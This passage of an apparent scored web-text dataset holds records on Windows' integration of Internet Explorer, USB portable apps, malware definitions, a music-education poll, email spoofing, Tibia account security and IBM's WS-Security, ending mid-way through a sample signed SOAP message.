using those tools, they were compiled into a special Winhelp format, and the process was complete. Unfortunately, because Winhelp was created before there was a rich document format like HTML in broad use, the Winhelp files that software developers created were not universally viewable. You couldn't easily create a document with images, animations and hyperlinks and make it available to everyone (they had to have Winhelp). You couldn't put the document on a network and enable people to view it from their machines, etc. Furthermore, there weren't a wide variety of tools available for authoring these \"help\" files. Today, Microsoft has revamped the help system in Windows to base it on HTML, the universal document format. (Screen shot at left.) This means that when an application vendor authors help files, the document created is universally viewable, and a much broader range of tools can be used to create it. Furthermore, the HTML standard is much richer than Winhelp was, so the content of help files can be made much better U even the background image at left wasn't possible with the old Winhelp system. In Windows 98, Help for Windows itself has been rewritten to the HTML format. This was easier for the Windows Help team to produce, and it results in a better experience for the end user. In creating Windows 98 Help, the team also added some enhancements to HTML—offering features like compression—and thus converting an old proprietary system to align it with today's open Internet standards. All this wouldn't be possible if support for HTML display wasn't built-in to the operating system. In order for any 3rd party software developer to decide to include HTML-based files as part of their application, they need to be assured that those files can be displayed on any machine—they need to know that users will not have to buy or download an additional viewer. In the same way application vendors can rely on the fact that support for toolbars is built into Windows, they can also rely on HTML support in the operating system. Application User Interfaces. Over the years, application vendors have employed various services in the operating system to draw parts of their user-interface on the screen. When you look at an application like Lotus Notes, Microsoft Publisher or Corel Wordperfect—and in particular when you open a dialog box in one of these applications—the gray user-interface elements you see were probably created by the application asking Windows to draw them. These user interfaces have worked well enough for the last 5 years, but now something better has come along. The HTML standard, as a universal document format, is a great way to describe how user interface elements should be displayed on the screen. (Those elements need no relationship to a \"web page\" or to the Internet at all.) In fact, the basic screens of today's applications are terrific candidates for being authored in HTML. HTML offers very rich and attractive visual options, and furthermore—because it's an open standard—the tools that exist for creating HTML are very good and getting better quickly. This means that it's possible for software developers to create better user-interfaces more easily by writing them in HTML. And today—now that Microsoft has included support for HTML in Windows itself—application vendors are beginning to take advantage of HTML's benefits without having to do all the work of writing the computer code necessary to display HTML themselves. One additional benefit of calling upon operating system services in Windows to display HTML is that if an application wants to include a page of content that does come from the Internet, it takes no additional work to display that as well. This makes for richer applications and less work for 3rd party software developers. There are a lot of examples already of applications taking advantage of the HTML-rendering support built into WindowsUprobably more than you'd think. Here's a partial list: ProComm95, ProComm Plus32 (Quarterdeck) IPublish (Design Intelligence) Norton System Genie (Symantec) Money98 (Microsoft. HTML user interface shown at right) Outlook, Outlook Express (Microsoft) Windows desktop (control panel, folders, explorer, etc.) Saving and Opening files from the Internet. You've undoubtedly taken it for granted that any new application you buy will enable you to save and open files on the hard disk inside your computer. You've probably also taken it for granted that the same application can save and open files from your Local Area Network if you have one. Of course, both these facts weren't always the case—before those capabilities were built into the operating system. Today, it's becoming very important for applications to be able to save and open files from the Internet. You may not realize how important this is yet, but over time the Internet will become a more routine place for you to save and open files than even your local hard disk. Think of the potential benefits—you could get to your files from work, home, or any random airport; perhaps someone will back them up automatically for you. (In fact, today one company—@Backup—is building a business doing just this.) Already, lots of important scenarios, like creating your own web page, sharing documents with people outside your company, etc., require applications to be able to open and save files from the Internet. This is another example of a platform service that's built into Windows in the portion of the operating system referred to as Internet Explorer. Again, you probably aren't even aware that some applications you're using now are able to save and open files from the Internet by taking advantage of this platform service provided by Windows. Here's one exampleUthe dialog box below is part of Microsoft Word 97, and the image shows how it's possible to open Microsoft Word documents from the Internet, on any FTP server. The Word development team created this new feature by utilizing Windows' built-in ability to open or save files from the Internet. Platform Services - Doesn't integration harm other peoples' businesses? A common question relating to integration of new platform services into the Windows operating system is whether this practice is good for consumers and potentially harmful to Microsoft's competitors. We thought the best way to respond to this was to ask software developers themselves, so we commissioned a 3rd party to survey a sample of software vendors that included both Microsoft competitors and partners. We asked specifically about how the integration of Internet technologies in Windows would affect their business. Here's what they said: 85% said this integration will have a positive impact on their company 83% said there will be positive impacts for end users 80% said there will be positive impacts for the software industry as a whole 79% said it will be easier to create new applications and bring new capabilities to their customers as a result of the integration Furthermore, you may wonder whether software developers as a whole think that integration of new innovations into existing software products contributes to the success of the software industry. In fact, the survey showed that the industry is growing as this phenomenon has been occurring—86% of software developers surveyed said their sales are increasing; while only 2% said their sales are declining. Often, people claim that features built into the operating system by Microsoft make 3rd party solutions unnecessary, and that this harms the businesses of other companies. If you look at some actual case studies, however, it becomes clear that integration is not the primary determinant of the continued success of such companies. MSN & Exchange Email – When Windows 95 shipped, the client software for the MSN online information service and a Microsoft Exchange email client were built into the operating system. The email client in particular is a great analogy to Internet Explorer. A significant part of the email client includes 3rd party services that any application can use (these are known as \"MAPI\" or Mail API), very much like the operating system services provided by the Internet Explorer component of Windows. In both these cases, the solutions built into Windows did not have any significant adverse effect on companies producing competing products—in fact, other online information services like AOL and many other email clients are doing very well compared to Microsoft's product offerings. This simply proves the point that consumers use what they like, regardless of whether something is included in Windows. Thus, if a competing product provides a more compelling user experience than a feature of Microsoft's operating system, consumers will opt for that competing product. Internet Explorer versions 1 & 2. These initial versions of Internet Explorer were built into every single version of Windows 95 preinstalled on new PCs—if you bought a new PC, it included Internet Explorer as an integrated part of the operating system. During those years, Netscape Navigator rocketed to extremely high usage rates, which occurred despite the fact that a variety of Internet technologies, including web-browsing functionality, were built into Windows. (Note: Netscape Navigator can also be preinstalled on brand-new PCs—Microsoft allows computer manufacturers to add whatever software icons they like to the Windows desktop.) In product reviews, early versions of Navigator consistently were picked as better than Internet Explorer. It wasn't until Microsoft created Internet Explorer 3.0 (and now 4.0) that reviewers chose Internet Explorer as superior to Netscape Navigator. And it has been during this more recent era that Internet Explorer's popularity has begun to increase compared to Netscape Navigator, proving once again that consumers can be depended upon to use the products they like. File Management Utilities. When Windows 3.1 was very popular (before Windows 95 had shipped), a number of companies made very good businesses out of selling file management and other similar utilities for Windows. The Norton Desktop and Norton Utilities were a great example. As Windows 95 was being finished, many people believed that its built-in utilities (better file manager, built-in customizable desktop, graphical disk tools) would greatly diminish the popularity of the Norton products. However, what actually happened was that the developers of those products saw that Windows 95 presented them with an opportunity. They upgraded and revised their utilities, building on new platform services provided by Windows to provide new value to consumers above and beyond that being built into the operating system. As a result, Symantec's Norton Utilities for Windows 95 became a best-selling software package. Finally, people sometimes wonder why Microsoft requires computer manufacturers and others who distribute Windows to include the complete platform of services, and not to pick-and-choose just the ones they want. The answer is simple—unless software developers can know in advance that the services they want to use (toolbars, sound, internet standards) will be present on a user's computer, then they must include that support in their own products. When that happens, it makes application installation more difficult, time-consuming and error-prone. (You may have seen those cryptic messages when installing a new application: \"The file FOOBAR.DLL being copied is older than the one on your system. Do you want to keep the present one?\" Huh?) By clearly defining the operating system services that are provided by Windows, we contribute to making application installation simple and reliable. Overall, we firmly believe that integration of new platform services into Windows—and in particular support for Internet standards—provides great benefits to the community of application developers and therefore creates an improving environment for end-users. And we aren't the only operating system vendor who thinks this—Sun Microsystems has built Internet technologies into Solaris 2.6, and IBM has done the same with OS/2 Warp 4. Integrating the User Interface to Benefit End-Users We've explained the principle behind integration and the assistance that integration provides to software developers in keeping up with the ever-changing demands of consumers by freeing them to focus on improving the unique aspects of their products. We haven't yet discussed how integration is also beneficial to end-users. In the general case, when new computer technologies are created, they tend to be added to Microsoft's user-interfaces as \"new components\". Often, the new component—perhaps a whole new application—has its own quirky characteristics compared to the old ones, and it takes quite a bit of learning for consumers to know how to use them both together. A good example of this would be the separate programs in Windows 3.1 for managing files, printers, programs and other system settings. Back in those days, it was easier for us to just add another new program—even though it was different from the others—rather than to rewrite everything so that a single-user interface made it possible for a user to obtain easy access to all such information. In Windows 95, one of the more significant steps forward was a single user interface paradigm—the \"folder\"—for access to everything from the files on your hard disk or LAN, to the printers in your office or printer room, to the settings for your modem. The nice thing about this is that once you've learned how to get to files on your hard disk, you already know how to get to everything else. The same paradigm holds for integration of user-interfaces used to browse information kept in different kinds of storage devices. In fact, the evolution of the Internet has offered a lot of new user interface paradigms that Microsoft is using to make the Windows user interface better. Innovations like hyperlinks, back/next buttons, and type-in addresses make the whole PC easier to use. Let's take just one example. In older versions of Windows, as you browse through your hard disk, you get multiple overlapping windows with no way to move between them when you go from place to place. When you use the browsing paradigms developed for navigating the Internet, you get a single window with back/next buttons, and it's easier to move from one file to another quickly, even if one is in Buffalo and the other in San Diego. Making the Windows user interface work the same as web browsing software—and even better, making it so you can access locally and remotely stored information from just one window—means the whole concept of browsing any kind of content is just plain easier. What's more, integration of web-standards in the Windows user interface makes it possible to provide compelling and useful new features like the file preview shown at left possible. Summary – Integration Makes Greater Innovation Possible As the creators of the Windows operating system, we at Microsoft believe that perhaps the most significant part of our job is to make Windows a continually better platform, and in particular, to: Deliver to application vendors the most important and useful platform services, so they can use those services as a foundation upon which to build their own innovative solutions to customers' needs. Continue to make Windows an easy, comprehensive environment for end-users, so that the common tasks they want to do with their PCs are as simple and straightforward as possible. We believe that the development of Internet standards has created a massive opportunity for the PC industry and for people who use PCs. We believe that it is our responsibility to provide enabling technology to bring those Internet standards to as many applications and as many people as possible.",
        "prob": "tensor([[2.1539e-04, 9.9978e-01]])"
    },
    {
        "text": "The USB drive is a handy little gadget that serves the purpose once reserved for floppy disks and Zip drives. It’s commonly used to move folders, files, and data easily from one computer to another in a format that’s often small enough to be given a second job as a key chain. There’s no need to burn data into the drive as you would with a CD or DVD; you can erase from and overwrite onto the USB drive as often as you need to until the darned thing falls apart. Add the fact that even USB drives capable of storing relatively large amounts of data are pretty darned cheap nowadays and you’ve got an ideal little workhorse for those files that you want to be able to use between the office, home, laptop, band camp, coffee shop, cyberpub, school, or wherever, really. One might wonder if a miraculous device so well suited to carting your data all over creation might have any alternative uses — wonder no more! You can also use a USB drive to boost your computer’s performance and run portable applications. What’s a portable application? Think about the files that you want to take from one computer to another — the reason you’re using a USB drive in the first place. Now think larger: Wouldn’t it be nice if you could use entire applications between computers without having to install them onto each system? There you go! Simply put, that’s what portable applications are. Mozilla’s Firefox Web browser, The OpenOffice suite of free Microsoft Office replacement applications, Google’s Chrome Web browser, and the Miranda IM client are just a few examples of portable applications that can be used directly from a USB drive. Looking a little further, you’ll find that everything from games to space simulators to Bible study to sound editors to the Skype VoIP service can also be used as portable applications from a USB drive. A few words of caution: Because a USB drive is so easy to use, it’s especially susceptible to viruses and malware, and because of its portable nature, it can serve as an unwitting carrier of such viruses and malware between computers. Make sure you’re using reliable sources to download portable apps (and really, haven’t we learned that this is a good idea no matter what it is we’re downloading?); one such recommended source is PortableApps.com. Depending on your operating system, knowing how to use a USB drive to run portable applications is as easy as your usual method of saving to or running regular applications from any other hard drive on your computer. The hard drives view on my computer (still running on Windows Vista, I’m moderately ashamed to say) looks like this before I add a USB drive: And then like this after the USB drive is added (notice the new Removable Disk “J” drive): Double clicking on that J drive will show me everything that’s currently on that drive. Double clicking on a portable application stored on that drive will run it on my computer — just as it would with any natively stored application. It’s really as easy as that! For an even easier time of it, the aforementioned PortableApps.com has an excellent platform for helping you add, delete, manage, and update portable applications. Do you regularly use any portable applications from a USB drive? Let us know what your experience has been and if you recommend any for our fellow LockerGnome readers.",
        "prob": "tensor([[2.6459e-05, 9.9997e-01]])"
    },
    {
        "text": "What is the difference between a virus, trojan and a rootkit A virus is a program or script written with an objective; collecting data, gaining control of a system, or opening a back door for future access to the system. A trojan is a program that caries a payload of a rootkit or a virus. A rootkit, much like a virus has an objective but functions at a lower level in the system. These are harder programs to identify and to remove. They function a the base layer of the operating system or can get into the boot sector of the operating system and infect the bios of the computer. What is Malware Malware stands for malicious software. it is any software designed with the intent of interrupting services. This includes trojans, viruses and rootkits. What is a Phishing Attack A phishing attack is an attack attempting to gather sensitive information. A Spear Phishing attack is a targeted phishing attack.",
        "prob": "tensor([[2.4985e-06, 1.0000e+00]])"
    },
    {
        "text": "Press release from CNW Group Poll: Learning A Musical Instrument May Boost Life Long Success Wednesday, April 06, 2011 Study shows Canadians who learned an instrument as a child reported higher levels of education; more than 2/3 believe it's just as important as sports or learning a second language. TORONTO, April 6 /CNW/ - If you learned to play a musical instrument as a child you are more likely to go further in school, according to a new XM Canada / Leger Marketing survey. In fact, seven out of 10 Canadians who learned a musical instrument as a child said it has had a positive effect on their lives and half agreed that learning an instrument helped them do better in school. Interestingly, 66 per cent of Canadians say learning an instrument is as important as learning a second language. The positive impact wasn't just academics. Reported lifelong benefits of learning this skill which can be carried throughout a person's career included: increased mental focus (46%), heightened creativity (45%), building confidence (32%) and ability to self-teach (32%). The positive relationship between education and music struck a chord when the poll results showed that those who learned to play an instrument were more likely to be college or university educated versus those who didn't (69% vs. 59% respectively) \"Learning to play an instrument is a huge part of many Canadians' lives and has significant impact years later,\" said Janet Gillespie, Marketing Vice-President, XM Canada. \"Ensuring that Canadian children have access to music education is critical for keeping Canadian music alive and growing people not only culturally but personally. It's a prime reason that XM Canada proudly supports initiatives to develop musical talent through organizations such as S'Cool Life Fund and MusiCounts.\" In November 2010, XM Canada collaborated with S'Cool Life Fund to launch a new called the XM Instrument Fund. This program will dedicate $100,000 to support the efforts of elementary schools across the country to refresh existing music programs and develop exciting new programming for students. The program is another example of XM Canada's commitment to support rising Canadian talent and encourage the artistic growth of the next generation of great performers and musicians. Recipient schools selected to receive the grant are expected to be announced by June 2011. The first note Canadians understand the importance of an education in music and almost unanimously believe that every child should be afforded the opportunity to learn an instrument (94%). Those who did learn to play instruments customarily begin at the elementary school age (61%) and more than three quarters of Canadians who learned to play an instrument cited parents (49%) and teachers (35%) as their top motivators. Additionally, 77% of Canadians agree that learning a musical instrument is just as important as playing sports. Regret? You bet. The study also revealed that 72% of those who did not learn an instrument as a child regret it and more than half (62%) of Canadians who did learn an instrument regret giving it up and wish they could still play it today. Additional Fast Facts Across the country - Sixty-six percent of Canadians surveyed learned to play an instrument as a child. - Residents of Quebec (73%) and Alberta (71%) were the most likely to indicate that they learned to play an instrument. - Albertans are more likely than most to state that learning an instrument is as important as learning a second language (80%) - Interestingly, the flute was immensely popular in Quebec, where 45% say that they learned to play this instrument as a child. Music talent - it's personal - Top three instruments Canadians learned as children? Piano (31%), Flute (18%), Guitar (15%) - Parents and teachers were the most common motivators for children learning to play an instrument but some said celebrities were their inspiration [Men (9%) vs. Women 4%)] - One third of Canadians said playing music was one of their favourite hobbies. - One in six respondents still play their instrument at least once a week. - Most Canadians admire accomplished musicians, and one third would give up their current jobs for a music career. For morn information about MusiCounts please visit: www.musicounts.ca For more information about S'Cool Life Fund please visit: www.scoollifefund.ca About the Survey The survey was completed on-line from March 7, 2011 to March 10, 2011 using Leger Marketing's online panel, LegerWeb, with a sample of 1549 Canadians. A probability sample of the same size would yield a margin of error of 2.49%. Leger Marketing's online panel has approximately 360,000 members nationally - with between 10,000 and 20,000 new members added each month, and has a retention rate of 90 percent. Panel members are randomly selected to receive email invitations to the individual surveys. We ensure the protection of privacy via the usage of unique URLs and respondent IDs in combination with survey IDs. About Canadian Satellite Radio Holdings, Inc. Canadian Satellite Radio Holdings Inc. (TSX: XSR) operates as XM Canada and is Canada's premium digital audio entertainment and information company with the best signal coverage across the country. With 130 digital channels of choice, XM Canada offers Canadian listeners the most unique and original Canadian and international programming, including commercial-free music channels, exclusive live concerts and sports coverage, and the best in talk, comedy, children's and entertainment programming. XM Canada is the satellite entertainment leader in the Canadian automotive market with long-term factory installation agreements with manufacturers that own close to 50 per cent share of the domestic vehicle market. XM's industry-leading products are available at shop.xmradio.ca, and at retailers nationwide. XM programming is available by subscribing directly through XM Canada and is also available as streams of commercial-free XM music channels on TELUS Music Radio and Rogers Wireless Radio on Demand. XM Canada is the exclusive music channel provider on Air Canada's flights. To find out more about Canadian Satellite Radio Holdings Inc. (TSX: XSR), visit: www.xmradio.ca/about/. Note to editors: Provincial/regional data available. For further information: Jill Yetman | Environics Communications, Inc. | 416-969-2722 | email@example.com",
        "prob": "tensor([[0.0456, 0.9544]])"
    },
    {
        "text": "Mandatory Access Control In computer security Mandatory Access Control (MAC) is a type of access control in which only the administrator manages the access controls. The administrator defines the usage and access policy, which cannot be modified or changed by users, and the policy will indicate who has access to which programs and files. MAC is most often used in systems where priority is placed on confidentiality. Contrast with Discretionary Access Control (DAC) which is determined by the user with permission. Featured Partners Sponsored - Increase worker productivity, enhance data security, and enjoy greater energy savings. Find out how. Download the “Ultimate Desktop Simplicity Kit” now.» - Find out which 10 hardware additions will help you maintain excellent service and outstanding security for you and your customers. » - Server virtualization is growing in popularity, but the technology for securing it lags. To protect your virtual network.» - Before you implement a private cloud, find out what you need to know about automated delivery, virtual sprawl, and more. »",
        "prob": "tensor([[4.8826e-05, 9.9995e-01]])"
    },
    {
        "text": "- Campus Life - Cost & Aid - News & Events - About Plattsburgh You've checked your machine with the latest version of anti-virus software. You've called the Helpdesk, and they sent someone over who gave your computer a clean bill of health. Yet, you still receive messages accusing you of spreading viruses to others via e-mail. Why? The reason may be due to any number of viruses that cleverly \"spoof\" or fake the return addresses on the loaded e-mails they send. Such viruses gather e-mail addresses from the infected machine, choosing one to list as the destination (To:) and one to \"spoof\" (fake) as the sender (From:). Most mail systems will let you put anything down as the sender (From:)address without validating or authenticating it. So, someone else's macchine is spreading a virus but you get the notification because the virus found your e-mail address on the infected system. To explain further, here is a sample scenario. Let's say firstname.lastname@example.org contracts a virus like MiMail. Some time after that, email@example.com receives a message from firstname.lastname@example.org that has a virus attachment in it. Leonardo's anti-virus software or his firewall catches it before it can infect his machine. The anit-virus or firewall software then sends a note to Isaac warning him that he is spewing out viruses. Isaac is totally confused as he knows that his firewall or anti-virus software would have caught it. As the interception of the virus and the notification are automatic, the actual messages are never examined to verify the sender's name. Had they been examined, they might have revealed that the original sender was from somewhere in sion.org. The only one can do is make sure one's anti-virus software is up to date and working. The confusion over who actually sent the virus will continue until e-mail software and protocols evolve to address this gap in security (spoofing). For more information about technology at SUNY Plattsburgh, please contact: Phone: (518) 564-4433 / toll-free 1-800-787-8773",
        "prob": "tensor([[2.0553e-06, 1.0000e+00]])"
    },
    {
        "text": "Have you ever been unsure about a trade that seems a little \"iffy,\" or something that just doesn't seem right? This guide could help you decide what to do when stuff like that happens, and it could one day save your account. Important: First read CipSoft Security Information Page Last updated: February 20th, 2011 As defined in the dictionary, hacking is \"to use one's skill in computer programming to gain unauthorized access to a file or network.\" If someone gets your account password and account number, they might take all of your stuff on your character, or possibly even your character itself. What Bad Things are out There? There are several ways someone can get your password to your account. Most can also do some bad things, not only to your Tibian account, but to your computer as well. |1. Trojans, Trojan Horses - These are malicious programs pretending to be a regular program. They can destroy data and send info back to the owner, such as passwords. The main difference between them and computer viruses is that they do not replicate. 2. Viruses - Bad programs made by people to (usually) do bad things to computers. They can be disguised as games, pictures, or regular programs. When executed they could destroy information. 3. Key Loggers - these are programs much like Trojans, but usually they don't destroy data. They keep track of every keystroke made, and then sends it back to the owner. 4. Worms - Worms are viruses that sit in the computer's memory, duplicating themselves. They can be sent to other computers through an email program, or IRC (internet relay chat), destroying data. 5. Spyware, Adware - Usually these come from programs with bundled software, like file sharing utilities. Both will track what sites you visit and what you do on them. 6. Guessing Passwords - although unlikely, if you have an easy password, someone could guess it, or -- automated scripts with common words dictionaries embedded can \"break\" your easy-to-figure password too! How Can A Person Get These? With exception to #6, all the programs above can be gotten from a computer program. Sometimes they can be sent by email, a downloaded program, or a website. But, usually you will not find any of these things unless you're looking for a cheat to the game, or doing other... bad things. If someone asks you to be their friend, and then tries to send you a file, reject it. Especially files with a .exe, .cmd, .bat, or .scr extension. Even if they want to send you a picture of them self, it'd advised not to accept it unless you absolutely trust the person. Ask them to upload it on a trusted image uploader instead. How Not to Get Them? There are lots of ways to be sure not to get any of the bad things mentioned earlier. Using your common sense is a good start! 1. Don't download anything questionable, like character modifiers, add-on Tibia programs, or toolkits, unless its from a trusted fan site. CipSoft has deemed what they consider trusted fansites on their fansites page. Even then, please use extreme caution. • McAfee - can be bought in stores or online.8. Scan for Spyware using any popular program such as: • Ad-Aware - an excellent program that will get rid of adware and spyware, along with other harmful programs. Here are some tips to make your password almost un-guessable! • Make sure you have a password of around 8-10 characters or even more. • Don't use words from a dictionary. Instead, mix words together that don't make a real word, or even use a number or 2. • Don't use your name or phone number for a password. don't use words that a friend could think of using (if you and a friend play Diablo, don't use 'diablo' for a password). • Never give out your password - not even to a friend. Your 'friend' could turn out to be someone you don't know at all. Myths & Facts Here are a few common myths about these things. Myth: CIP or a Gamemaster needs my Account Number or Password Fact: CipSoft will never ask you for your password, they do not need it. Nor a Gamemaster will do. Or a Counsellor. Or a Tutor. Myth: I can't trust any websites anymore! Fact: Not all sites are bad, and about 99.8% of the ones you can find are good, and want to help you out. Unless you want to find a cheat or something, you won't find the other .2%. Myth: Having antivirus software and a firewall makes me invincible to bad stuff! Fact: Although it does help a lot, you should still be careful. Myth: If you get a virus, you need to buy a new computer. Fact: Absolutely not! There's a number of things you can do to fix it. For one, try getting a program mentioned above, such as Ad-Aware and try scanning. If that doesn't work, you could always choose the 'road less traveled by' and reformat, but sometimes it takes awhile. Myth: There are item duplicators. Fact: If you read any post from people saying they have an item duplicator, or they contact you in-game saying they can duplicate your items, it's a guaranteed scam. Myth: There are magical start editing hacks! Fact: That's a nonsense. All they want is your password or keylog you. How keyloggers work There are lots of keylogging programs out there today. I've seen lots, and I mean lots. But, the people here tend to use 2 types of keyloggers. Sc-Keylog and BlazingTools Perfect Keylogger (or BPK for short). 1. Sc-Keylog: How this works; It is a file by itself, usually and .EXE. When you open it, you will see that nothing happens. Usually this means that the file is running in the background, and you can ALT+CTRL+DEL to find it in the 'Processes' tab. 2. BPK: This program works by binding to another program, say tibia.exe. The program will run fine, but what you dont know is that it secretly installed BPK into your system. BPK will either send it to a person's e-mail or upload it to an FTP. In order for this to work, you need to supply a User+Pass for the e-mail or the website which you are uploading to. There are programs out that will decrypt the infected file, and will find their User+Pass that the provided. Payback! :) Despite everything.... \"I am hacked!\" We are sorry to hear you have been hacked. Before you can get your account back there are certain things that you must take care of. If you do not remove your security problem first you risk being hacked again. 1. Find out how the hacker got access to your account and remove the security problem. Carefully think over everything that has happened to your account and your computer during the last few weeks. Here are some questions that might help:• Is it possible that you have a computer virus or a spy program on your computer? Please use one or two up-to-date virus scanners to check your computer. If a virus is found remove it before you do anything else. • Did you share your account data with anybody? A person that knows your account data can easily hack you.Do not risk that again. • Is your email address safe? Try to secure your email address by changing the email password. To find out more about possible security leaks read Tibia's Security Hints carefully. If you follow these guidelines your account should be well protected against any further hacking attempts. Remember, if you try to get your account back before the security leak is removed it is quite possible that the hacker will again get access to your account. 2. Get your account back. To get back access to your account you have to use the Lost Account Interface. Specify your problem there and follow the instructions. Please note that a new password will only be sent to the email address to which the account is registered. If you have lost access to this email address try to get it back. For example you can contact your email provider and ask for help. Once you have access to the registered email address the Lost Account Interface will work.",
        "prob": "tensor([[1.3926e-04, 9.9986e-01]])"
    },
    {
        "text": "Over the past couple of years, web services has gone from being an overly-hyped technology to one that many organizations are using productively. The early implementations, like all new technology projects, tended to be sandbox-type efforts or projects that were small, inside the firewall, and non-mission-critical in nature. Those brave souls that tried to venture into the world of delivering web services over the Internet found that they either had to provide services that were open and available for use by anyone (for example XMethods or Amazon) or had to develop their own, typically proprietary, very company-specific, security scheme. Early adopters using the Internet as their transport typically used some form of registration process (for example Google) for open Internet services or only provided services to a small number of business partners with whom they already had a tight, trusted relationship. For example, in order to use Google's web service-enabled search engine, the service requester must first register with Google through an HTML based form. As part of the registration process, Google sends the requester an email with a security \"token\". When the requester invokes the service, they provide this token to Google as part of the SOAP message to verify that they are a registered, authorized user of the Google web service. In these situations, even though service providers were using industry standards such as SOAP, additional information concerning the security scheme/process needed to be provided in order for the service requestors to be able to use the service. This had a rather undesired effect of tightly coupling the requester and the provider, a scenario that wasn't desired by either party. Clearly an industry standard way of securing a web service was required, and IBM, Microsoft, and VeriSign responded to this need in April, 2002. From the WS-Security specification (see also Resources): \"WS-Security describes enhancements to SOAP messaging to provide quality of protection through message integrity, message confidentiality, and single message authentication. These mechanisms can be used to accommodate a wide variety of security models and encryption technologies. WS-Security also provides a general-purpose mechanism for associating security tokens with messages. No specific type of security token is required by WS-Security. It is designed to be extensible (e.g. support multiple security token formats). For example, a client might provide proof of identity and proof that they have a particular business certification.\" Since 1997, IBM has had a program called jStart (short for jump-start -- see Resources) to help its customers and business partners work with new emerging technologies. The program's goal is to help early adopters leverage new technologies to help make their businesses more successful. Last fall, the jStart program worked with a company who wanted to provide a business-to-business web service using the Internet as a transport. They desired a strong level of security and interoperability, and they decided to use a WS-Security approach to secure the SOAP message traffic with their business partners. This paper discusses that project and its use of WS-Security. As the use cases for our customer's application were being developed, a set of security-related, non-functional requirements were identified: - The communication between our customer and his business partner should not be able to be viewed by a third party as it travels on the Internet. - Our customer needed to be able to determine from whom the message was coming and be able to verify that the sender was who the sender claimed to be. - Our customer needed to be able to ensure that the data being transmitted was not tampered with. Non-functional requirement #1 will be addressed through the use of HTTPS/SSL transport security. Since this application will be a point-to-point application, with no third party service providers or intermediaries involved, the idea of using cryptography to encrypt all or part of the SOAP message was evaluated but not implemented at this time. Given no third parties were involved, the value gained from an additional encryption step that would encrypt a segment of the SOAP message was not enough to justify the additional development expense and complexity that would have been needed to implement a form of message-level encryption. Non-functional requirements #2 and #3 will be addressed through the use of digital signatures and digital certificates. When using a digital certificate approach, the web service requester must have a digital certificate which has been signed by a trusted certificate authority. The requester will use this certificate to assert their identity and will digitally sign the SOAP message so that the requester's identity and the message's integrity can be verified. Once the message is received at our customer's system, it will be time stamped and logged. At this point, the digital signature will be validated. The validation process will ensure that the message came from the sender as well as verify that the message contents have not been modified since it was signed at the sender's site. The SOAP message log that our customer creates in DB2 will be used for non-repudiation purposes. Now that you understand the requirements and the technical approach, let's take a look at what was implemented. The application that our customer chose to implement as a web service was developed using WebSphere Studio Application Developer and some tools from the IBM alphaWorks web site, namely, the XML Security Suite, and the Apache Axis run time that was part of the IBM Web Services Toolkit. Although the application is quite powerful as it drives our customer's core business application, it is simple in that it only implements one method. It was deployed on WebSphere Application Server and interacts with the customer's core business application through WebSphere MQ Series. By using the TCP/IP monitor that is part of Application Developer, we've captured the SOAP message that is sent to the web service for processing. Note that in order to maintain the confidentiality of our customer, we made the SOAP URLs generic, removed the application-specific SOAP payload, and slightly modified some of the calculated values: 1. <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"> 2. <soapenv:Header> 3. <wsse:Security soapenv:actor=\"http://www.jStartcustomer.com/actors#verifier\" soapenv:mustUnderstand=\"1\" xmlns:wsse=\"http://schemas.xmlsoap.org/ws/2002/04/secext\"> <Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\"> 4. <SignedInfo> 5. <CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/> 6. <SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/> 7. <Reference URI=\"#sign_content_1043176028580\"> 8. <Transforms> 9. <Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/> 10. </Transforms> 11. <DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/> 12. <DigestValue>FLuQTa/LqDIZ5F2JSaMRHSRuaiQ=</DigestValue> 13. </Reference> 14. </SignedInfo> 15. <SignatureValue> 16. kGlrrXjKku/WXKxID+JJkEXY+aGNYHc5dy8GwbLFtB5Msll2/MhwdnO9wastJ0gLPzLy3oHL 17. 7A8ggkMkjgAqnLg6PTzM7MdKoIAhe+xRHdOysamGucFJQRMrU+JQ4WATJt0bpdClwJy6mexT 18. Su48mq1q5rM9YZh61P7UEUKt+EQ= 19. </SignatureValue> 20. <KeyInfo xmlns=\"http://www.w3.org/2000/09/xmldsig#\"> 21. <KeyValue> 22. <RSAKeyValue> 23. <Modulus> 24. 2sW+eBjx5D2QMyr8ocZIZWNYHGf9zYhB4XWILPCTvhNV7dIe3l8ARepOA1ABFK2OMy 25. pzb+Rb+nWQeo//yFz/28PmL63kdLiE72qmmQuzuPa5NXaV9pJ4JKw86QdLhGGpFIRH 26. 18Iugf3xLFwQEZqKYnblTUs7ftnTgW5r4HH492k= 27. </Modulus> 28. <Exponent>AQAB</Exponent> 29. </RSAKeyValue> 30. </KeyValue> 31. <X509Data> 32. <X509IssuerSerial> 33. <X509IssuerName>OU=Java,O=IBM,L=Unknown,ST=Oklahoma,C=US</X509IssuerName> 34. <X509SerialNumber>0</X509SerialNumber></X509IssuerSerial> 35. <X509SubjectName>CN=John Doe</X509SubjectName> 36. <X509Certificate> 37. MIIB0TCCAToCAQAwDQYJKoZIhvcNAQEEBQAwTzELMAkGA1UEBhMCVVMxETAPBgNVBAgTCE9rbGFo 38. b21hMRAwDgYDVQQHEwdVbmsam3duMQwwCgYDVQQKEwNJQk0xDTALBgNVBAsTBEphdmEwHhcNMDIw 39. OTI1MTAxMTQ4WhcNMDMwOTI1MTAxMTQ4WjATMREwDwYDVQQDEwhKb2huIERvZTCBnzANBgkqhkiG 40. 9w0BAQEFAAOBjQAwgYkCgYEA2sW+eBjx5D2QMyr8ocZIZWNYHGf9zYhB4XWILPCTvhNV7dIe3l8A 41. RepOA1ABFK2OMypzb+Rb+nWQeo//yFz/28PmL63kdLiE72qmmQuzuPa5NXaV9pJ4JKw86QdLhGGp 42. FIRH18Iugf3xLFwQEZqKYnblTUs7ftnTgW5r4HH492kCAwEAATANBgkqhkiG9w0BAQQFAAOBgQCs 43. OD02WMoYcMR7Sqdb9oQyk7Nn4rQ5DBgZ5mxGGVzWxBZW/QON+Ir2j4KUjX1jalMvbHa9lnhPQmJi 44. 